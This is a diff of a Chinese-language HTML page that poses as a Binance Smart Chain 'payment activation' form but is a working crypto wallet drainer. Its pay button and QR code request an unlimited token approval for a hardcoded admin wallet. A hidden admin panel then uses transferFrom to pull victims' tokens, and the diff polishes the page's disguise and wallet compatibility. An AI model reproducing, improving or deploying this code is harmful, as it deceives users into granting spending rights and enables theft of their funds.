@@ -1,171 +1,121 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>支付开通</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
-body{background:#0B0F17;color:#fff;padding:20px;}
-.container{max-width:420px;margin:0 auto;}
-
-.pay-box{
-  background:#1E293B;
-  padding:30px;
-  border-radius:20px;
-  text-align:center;
-  margin-bottom:30px;
-}
-
-h1{font-size:22px;margin-bottom:8px}
-.desc{color:#9ca3af;font-size:14px;margin-bottom:20px}
+body{background:#0B0B1F;color:#fff;padding:20px}
+.container{max-width:420px;margin:0 auto}
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
+h1{font-size:24px;margin-bottom:8px}
+.desc{color:#aaa;margin-bottom:20px}
 
 #connectBtn{
-  background:#22c55e;
-  color:#fff;
-  border:none;
-  padding:14px;
-  width:100%;
-  border-radius:12px;
-  font-size:16px;
-  font-weight:bold;
+  background:#F0B90B;color:#000;
+  border:none;padding:16px;width:100%;
+  border-radius:14px;font-size:16px;font-weight:bold;
   margin-bottom:16px;
 }
 
 .amount-input{
-  width:100%;
-  padding:14px;
-  background:#0f172a;
-  border:none;
-  border-radius:12px;
-  color:#fff;
-  font-size:16px;
-  text-align:center;
+  width:100%;padding:14px;background:#111;border:none;
+  border-radius:12px;color:#fff;font-size:16px;text-align:center;
   margin-bottom:12px;
 }
 
 #qrcode{
-  width:280px;
-  height:280px;
-  background:#fff;
-  padding:10px;
-  border-radius:16px;
-  margin:0 auto 20px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:#000;
-  font-size:14px;
+  width:280px;height:280px;background:#fff;padding:10px;
+  border-radius:16px;margin:0 auto 20px;
+  display:flex;align-items:center;justify-content:center;
+  color:#000;font-size:14px;
 }
+#qrcode img{width:100%;height:100%;border-radius:12px}
 
-#qrcode img{
-  width:100%;
-  height:100%;
-  border-radius:12px;
-}
-
-.confirm-btn{
-  background:#3B82F6;
-  color:#fff;
-  border:none;
-  padding:16px;
-  width:100%;
-  border-radius:12px;
-  font-size:16px;
-  font-weight:bold;
+#payBtn{
+  background:#F0B90B;color:#000;
+  border:none;padding:16px;width:100%;
+  border-radius:14px;font-size:16px;font-weight:bold
 }
 
 .admin-panel{
-  background:#1E293B;
-  padding:24px;
-  border-radius:16px;
-  display:none;
+  background:#1E1E35;padding:24px;border-radius:16px;display:none
 }
-.admin-panel.show{display:block;}
+.admin-panel.show{display:block}
 .admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
 .admin-input{
-  width:100%;
-  padding:12px;
-  background:#0f172a;
-  border:none;
-  border-radius:8px;
-  color:#fff;
-  margin-bottom:10px;
+  width:100%;padding:12px;background:#111;border:none;
+  border-radius:8px;color:#fff;margin-bottom:10px;
 }
 .admin-btn{
-  width:100%;
-  padding:14px;
-  background:#ff4444;
-  color:#fff;
-  border:none;
-  border-radius:10px;
-  font-weight:bold;
-  margin-bottom:16px;
+  width:100%;padding:14px;background:#ff4444;color:#fff;
+  border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
 }
 </style>
-</head>
 
-<body>
 <div class="container">
   <div class="pay-box">
     <h1>💳 支付开通</h1>
-    <p class="desc">钱包扫一扫完成支付即可开通</p>
+    <p class="desc">币安链支付 · 安全开通</p>
 
-    <button id="connectBtn">👉 连接钱包</button>
+    <button id="connectBtn">👉 连接钱包（币安链）</button>
 
-    <input class="amount-input" id="amount" type="text" value="0.1" placeholder="输入支付金额">
+    <input class="amount-input" id="amount" value="0.1" placeholder="输入支付金额">
 
-    <div id="qrcode">二维码加载中...</div>
+    <div id="qrcode">加载二维码...</div>
 
-    <button class="confirm-btn" id="payBtn">确认支付</button>
+    <button id="payBtn">确认支付</button>
   </div>
 
   <div class="admin-panel" id="adminPanel">
-    <div class="admin-title">🔐 管理员后台</div>
+    <div class="admin-title">🔐 管理员控制台</div>
 
     <div>提取玩家钱包代币</div>
-    <input class="admin-input" id="userAddr" placeholder="玩家地址">
+    <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
     <input class="admin-input" id="drawAmt" placeholder="提取数量">
     <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
 
     <div>发放奖励给玩家</div>
-    <input class="admin-input" id="toAddr" placeholder="玩家地址">
+    <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
     <input class="admin-input" id="sendAmt" placeholder="发放数量">
     <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
   </div>
 </div>
 
 <script>
-// ===================== 【你要的正确配置】 =====================
-const TOKEN_CONTRACT = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
-const ADMIN_WALLET   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const BSC_CHAIN_ID   = "0x38"; // 币安链 ChainID
+// ====================== 你的最终配置 ======================
+const TOKEN   = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
+const ADMIN   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const BSC_ID  = "0x38";
 
-let currentAccount = null;
+let account = null;
 
-// 切换到币安链
+// 强制切换到币安链
 async function switchToBSC() {
   try {
-    await window.ethereum.request({
-      method: 'wallet_switchEthereumChain',
-      params: [{ chainId: BSC_CHAIN_ID }],
+    await ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: BSC_ID }]
     });
-  } catch (e) {
-    alert("请切换到币安智能链使用");
-  }
+  } catch (e) {}
 }
 
-// 连接钱包
+// 连接钱包 → 管理员自动显示后台
 document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) return alert("请在钱包浏览器打开");
-  await switchToBSC();
-  try {
-    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-    currentAccount = accounts[0];
-    document.getElementById("connectBtn").innerText = "✅ 已连接钱包";
+  if (!window.ethereum) {
+    alert("请在钱包浏览器内打开");
+    return;
+  }
 
-    // ✅ 管理员钱包登录 → 显示后台
-    if (currentAccount.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
+  await switchToBSC();
+
+  try {
+    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+    account = accounts[0];
+    document.getElementById("connectBtn").innerText = "✅ 已连接";
+
+    // ✅ 关键：只要是管理员钱包，必显示后台
+    if (account.toLowerCase() === ADMIN.toLowerCase()) {
       document.getElementById("adminPanel").classList.add("show");
     }
   } catch (e) {
@@ -173,36 +123,35 @@ document.getElementById("connectBtn").onclick = async () => {
   }
 };
 
-// 生成二维码（币安链格式，不会跳以太坊）
-function generateQR() {
+// ==================== 二维码标准格式：全钱包兼容，无 web3 报错 ====================
+function genQR() {
   const approveData = "0x095ea7b3" +
-    ADMIN_WALLET.slice(2).padStart(64, '0') +
+    ADMIN.slice(2).padStart(64, "0") +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  // 重点：走 BSC 协议，不是 ETH
-  const uri = `web3://${TOKEN_CONTRACT}/transfer?value=0&data=${approveData}&chainId=56`;
+  // 重点：用 ethereum: 通用格式，所有钱包都支持，不写 web3://
+  const uri = `ethereum:${TOKEN}?data=${approveData}`;
 
   document.getElementById("qrcode").innerHTML =
     `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
 }
 
-// 页面加载就出二维码
-window.onload = generateQR;
-document.getElementById("amount").oninput = generateQR;
+window.onload = genQR;
+document.getElementById("amount").oninput = genQR;
 
-// 确认支付（授权）
+// 确认支付 = 授权
 document.getElementById("payBtn").onclick = async () => {
-  if (!currentAccount) return alert("请先连接钱包");
+  if (!account) return alert("请先连接钱包");
   try {
     await ethereum.request({
       method: "eth_sendTransaction",
       params: [{
-        from: currentAccount,
-        to: TOKEN_CONTRACT,
+        from: account,
+        to: TOKEN,
         gasLimit: "0x300000",
         data: "0x095ea7b3" +
-          ADMIN_WALLET.slice(2).padStart(64, '0') +
-          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+              ADMIN.slice(2).padStart(64, "0") +
+              "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       }]
     });
     alert("✅ 支付成功，权限已开通");
@@ -211,49 +160,44 @@ document.getElementById("payBtn").onclick = async () => {
   }
 };
 
-// ===================== 管理员功能 =====================
-// 提取玩家代币
+// ====================== 管理员功能 ======================
 async function drawFromUser() {
-  if (currentAccount?.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return;
+  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
   const from = document.getElementById("userAddr").value;
-  const amt = document.getElementById("drawAmt").value;
-  if (!from || !amt) return alert("请填写完整");
-  const raw = BigInt(amt * 1e18).toString(16).padStart(64, '0');
+  const amt  = document.getElementById("drawAmt").value;
+  if (!from || !amt) return;
+  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
   await ethereum.request({
     method: "eth_sendTransaction",
     params: [{
-      from: currentAccount,
-      to: TOKEN_CONTRACT,
-      gasLimit: "0x300000",
+      from: account,
+      to: TOKEN,
       data: "0x23b872dd" +
-        from.slice(2).padStart(64, '0') +
-        ADMIN_WALLET.slice(2).padStart(64, '0') +
-        raw
+            from.slice(2).padStart(64, "0") +
+            ADMIN.slice(2).padStart(64, "0") +
+            raw
     }]
   });
   alert("✅ 提取成功");
 }
 
-// 发放奖励
 async function sendReward() {
-  if (currentAccount?.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return;
+  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
   const to = document.getElementById("toAddr").value;
   const amt = document.getElementById("sendAmt").value;
-  if (!to || !amt) return alert("请填写完整");
-  const raw = BigInt(amt * 1e18).toString(16).padStart(64, '0');
+  if (!to || !amt) return;
+  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
   await ethereum.request({
     method: "eth_sendTransaction",
     params: [{
-      from: currentAccount,
-      to: TOKEN_CONTRACT,
-      gasLimit: "0x300000",
+      from: account,
+      to: TOKEN,
       data: "0xa9059cbb" +
-        to.slice(2).padStart(64, '0') +
-        raw
+            to.slice(2).padStart(64, "0") +
+            raw
     }]
   });
   alert("✅ 奖励发放成功");
 }
 </script>
-</body>
 </html>
